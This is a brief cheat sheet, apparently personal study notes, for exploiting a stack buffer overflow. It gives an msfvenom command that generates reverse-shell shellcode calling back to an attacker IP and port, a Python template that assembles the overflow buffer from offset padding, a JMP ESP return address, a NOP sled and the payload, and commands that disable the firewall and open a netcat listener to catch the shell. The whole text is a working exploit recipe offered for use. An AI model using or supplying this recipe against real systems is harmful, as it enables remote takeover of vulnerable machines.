# Shellcode

```Bash
msfvenom -p <payload> LHOST=<attacker ip> LPORT=<attacker port> EXITFUNC=thread -f c -a x86 -b "<bad chars>"
```

**NOTE:** If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\x90) to the payload.)

```Python
prefix = b""
offset = <offset>
overflow = b"A"*offset
returnaddr = b"<JMP ESP addr>"
padding = b"" # NOPs (e.g. \x90\x90\x90)
payload = b"<msfvenom output>"
postfix = b""
buffer = prefix + overflow + returnaddr + padding + payload + postfix
```

```Bash
sudo ufw disable
nc -lvnp <attacker port>
```

Crash the app and get shell
